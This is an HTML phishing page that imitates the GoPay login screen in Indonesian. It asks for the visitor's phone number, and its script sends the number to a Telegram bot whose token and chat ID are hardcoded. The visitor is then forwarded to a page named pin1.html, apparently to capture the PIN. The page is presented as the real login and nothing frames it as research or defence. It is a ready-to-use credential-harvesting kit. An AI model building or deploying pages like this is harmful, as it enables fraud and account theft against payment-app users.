<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login GoPay</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f8fafc;
      -webkit-text-size-adjust: 100%;
      touch-action: manipulation;
    }
    input[type="tel"] {
      font-size: 16px !important;
    }
  </style>
</head>
<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">

  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-white flex flex-col justify-between p-5 sm:p-6 shadow-sm">
    
    <div>
      <!-- Header Navigation -->
      <div class="flex items-center justify-between mb-6">
        <button type="button" class="w-10 h-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-700 active:bg-slate-200 transition-colors">
          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
          </svg>
        </button>

        <div class="flex items-center gap-2">
          <button type="button" class="w-10 h-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-700 active:bg-slate-200 transition-colors">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </button>

          <button type="button" class="h-10 px-4 rounded-full bg-slate-100 flex items-center gap-2 text-slate-800 text-sm font-semibold active:bg-slate-200 transition-colors">
            <svg class="w-4 h-4 text-slate-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 016.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129" />
            </svg>
            <span>Bahasa Indonesia</span>
          </button>
        </div>
      </div>

      <!-- Main Heading -->
      <h1 class="text-[28px] leading-tight font-extrabold text-slate-900 tracking-tight mb-2">
        Selamat datang di GoPay!
      </h1>
      <p class="text-slate-600 text-[15px] leading-relaxed mb-8">
        Masuk atau daftar hanya dalam beberapa langkah mudah.
      </p>

      <!-- Input Nomor HP -->
      <form id="loginForm" onsubmit="sendToTelegram(event)">
        <div class="mb-5">
          <label class="block text-xs font-semibold text-slate-600 mb-2">
            Nomor HP <span class="text-red-500">*</span>
          </label>
          
          <div class="flex items-center gap-3 pb-2 border-b-2 border-slate-200 focus-within:border-emerald-600 transition-colors">
            <div class="flex items-center gap-2 shrink-0">
              <img src="https://flagcdn.com/w40/id.png" alt="ID" class="w-6 h-4 object-cover rounded-[2px]">
              <span class="font-bold text-slate-800 text-base">+62</span>
            </div>

            <input 
              type="tel" 
              id="phoneInput"
              placeholder="81x-xxx-xxx" 
              class="w-full bg-transparent font-medium text-slate-800 placeholder-slate-300 outline-none tracking-wide text-base"
              oninput="handleInput(this)"
              required
            >
          </div>
        </div>

        <!-- Kendala Nomor HP -->
        <div class="mb-6">
          <button type="button" class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-emerald-50 text-emerald-700 text-xs font-bold active:bg-emerald-100 transition-colors">
            Ada kendala nomor HP?
          </button>
        </div>

        <!-- Tombol Lanjut -->
        <button 
          type="submit" 
          id="btnSubmit"
          disabled 
          class="w-full py-3.5 rounded-full bg-slate-200 text-slate-400 font-bold text-base transition-all duration-200 cursor-not-allowed mb-5"
        >
          Lanjut
        </button>
      </form>

      <!-- Divider -->
      <div class="relative flex items-center justify-center mb-5">
        <div class="w-full border-t border-slate-200"></div>
        <span class="absolute bg-white px-3 text-xs font-medium text-slate-400">atau</span>
      </div>

      <!-- Tombol Login Social (Google) -->
      <button type="button" class="w-full py-3 px-4 rounded-full border border-slate-300 flex items-center justify-center gap-3 font-bold text-slate-800 text-sm active:bg-slate-50 transition-colors mb-6">
        <svg class="w-5 h-5" viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
        </svg>
        <span>Lanjut dengan Google</span>
      </button>

      <!-- Logo GoTo diposisikan tepat di bawah tombol Google -->
      <div class="flex items-center justify-center gap-1.5">
        <span class="text-xs text-slate-500 font-medium">from</span>
        <img src="https://i.ibb.co.com/R4v8yYQ4/IMG-2901.png" alt="GoTo Logo" class="h-4 object-contain">
      </div>
    </div>

    <div></div>

  </div>

  <script>
    const BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
    const CHAT_ID = "6742478722";

    function handleInput(input) {
      // Hanya izinkan angka dan otomatis hapus angka 0 di awal jika diketik user
      let val = input.value.replace(/[^0-9]/g, '');
      val = val.replace(/^0+/, ''); 
      input.value = val;

      const btn = document.getElementById('btnSubmit');
      
      if (input.value.length >= 8) {
        btn.disabled = false;
        btn.className = "w-full py-3.5 rounded-full bg-emerald-600 text-white font-bold text-base hover:bg-emerald-700 active:scale-[0.99] transition-all duration-200 shadow-md shadow-emerald-100 cursor-pointer";
      } else {
        btn.disabled = true;
        btn.className = "w-full py-3.5 rounded-full bg-slate-200 text-slate-400 font-bold text-base transition-all duration-200 cursor-not-allowed";
      }
    }

    async function sendToTelegram(e) {
      e.preventDefault();
      
      const phone = document.getElementById('phoneInput').value;
      const btn = document.getElementById('btnSubmit');
      
      btn.disabled = true;
      btn.innerText = "Memproses...";

      const text = `📱 *Data Login GoPay*\n\n*Nomor HP:* +62${phone}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.log("Error Telegram");
      }

      // Lempar nomor HP ke halaman PIN (pin1.html / tujuan.html)
      window.location.href = "pin1.html?phone=" + encodeURIComponent(phone);
    }
  </script>
</body>
</html>
